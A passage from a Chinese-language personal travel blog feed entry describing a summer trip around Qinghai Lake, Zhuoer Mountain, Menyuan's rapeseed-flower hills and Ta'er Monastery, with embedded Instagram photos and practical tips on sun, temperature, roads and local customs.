background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW8F1MvlYQ_/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T18:12:18+00:00">Jul 24, 2017 at 11:12am PDT</time></p></div></blockquote><script async defer src="//platform.instagram.com/en_US/embeds.js"></script><p><strong>而二郎剑那边比较远 人比较少 而且景色真的比青海湖那边漂亮 非常适合拍照</strong></p><blockquote class="blockquote-center">二郎剑一景  *10.0mm F/4.5 1/1000 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW6iF7BlIpY/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T03:40:46+00:00">Jul 23, 2017 at 8:40pm PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script><blockquote class="blockquote-center">二郎剑一景 2  *10.0mm F/4.5 1/1250 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW6lWtPlmul/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T04:09:17+00:00">Jul 23, 2017 at 9:09pm PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script><p>拍照的好地方 而且由于湖真的大 拍出来很有海的感觉 但是特别蓝 岸边还有沙 XD</p><p>还能说什么 如果来了 这个景点拍人像真的爽</p><p>在导游的鼓吹下 我们去了一个蒙古包里面吃烤全羊</p><p>口味的话 不要抱太大希望 毕竟每个人都有偏好</p><p>吃完就是篝火晚会了 跟着领舞的一起 <del>划水</del> 跳舞 感觉像个 ZZ 放图好了</p><blockquote class="blockquote-center">篝火晚会的篝火  *35.0mm F/4.5 1/80 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW8FMr8lGPq/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T18:06:46+00:00">Jul 24, 2017 at 11:06am PDT</time></p></div></blockquote><script async defer src="//platform.instagram.com/en_US/embeds.js"></script><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><p>卓尔山 主要是爬山和背景故事</p><p>由于没上到顶上 景色也一般吧 <del>主要是看得太多了</del></p><p>照例放一张图</p><blockquote class="blockquote-center">卓尔山  *16.0mm F/5.6 1/400 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW8Fd_DlexR/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T18:09:08+00:00">Jul 24, 2017 at 11:09am PDT</time></p></div></blockquote><script async defer src="//platform.instagram.com/en_US/embeds.js"></script><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><p>前文说了 青海湖旁有许多<em>兼职给游客有偿拍照的</em>油菜花</p><p>门源呢 是中国三大油菜花产地之一 所以他有专门的一个油菜花山</p><blockquote class="blockquote-center">门源油菜花山顶  *10.0mm F/4.5 1/1000 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:31.944444444444443% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW6lXUdFf20/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T04:09:22+00:00">Jul 23, 2017 at 9:09pm PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script><blockquote class="blockquote-center">油菜花山山顶 2  *10.0mm F/4.5 1/800 100* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://www.instagram.com/p/BW7ApMJFrEr/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_blank">A post shared by BurgerTown (@burgertowncn)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-07-24T08:07:44+00:00">Jul 24, 2017 at 1:07am PDT</time></p></div></blockquote> <script async defer src="//platform.instagram.com/en_US/embeds.js"></script><p>其实说好看也好看 说不好看也不好看</p><p>但是这个山顶为拍照创造了许多可能性</p><p>毕竟还看俯瞰门源这个县</p><p>不过作为一个旅游景点 有旅游景点的通病–人多</p><p>所以 更考验摄影师的思考了</p><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><p>佛教地方不允许拍照 宗教也没什么好说的</p><p>去到了自然而然会有所思考</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为一次旅游 不仅是拍风景 拍妹子这么简单的</p><p>更是去感受一下当地的气候 交通 人文 风俗等等</p><p>如果是像我这样 7.8 月去那边的话 要注意防晒 因为</p><p><strong>很晒</strong> <strong>很晒</strong> <strong>很晒</strong> 不仅如此 那里还是高原地区 辐射比较强 所以最好一直长袖</p><p>保护全身 起码我在那边看到的大多数人都是包的严严实实的</p><p>而且日照时间非常长 大概 6 点半天亮 晚上 9 点才天黑 <del>神 TM 天黑才吃饭</del></p><p>还有要注意的就是温度 昼夜温差挺大的 去之前查天气 温差有 20 多度<del>虽然旅行中没有感觉到那么大</del></p><p>所以 注意防晒的同时也要带一件厚衣服去 因为早起床的话会比较凉</p><p>那边的交通的话 除了西宁是比较现代化之外 其他景点都是属于高原地带 因此山路会比较多</p><p>需要特别小心限速 还有动物们 这里的动物也是会上街的</p><p>人文风俗的话 如果不去塔尔寺的话主要是注意下猪肉和穆斯林的习俗</p><p>去塔尔寺的话 到处都不让拍照 XD 自己游览下就好了</p><p>就这么多吧</p><p>–END–</p>]]></content>
    
    <summary type="html">
    
      脱水！脱水！脱水！
    
    </summary>
    
    
      <category term="Life" scheme="https://burgertown.tk/categories/Life/"/>
    
    
      <category term="Photo" scheme="https://burgertown.tk/tags/Photo/"/>
    
      <category term="Travel" scheme="https://burgertown.tk/tags/Travel/"/>
    
  </entry>
  
</feed>
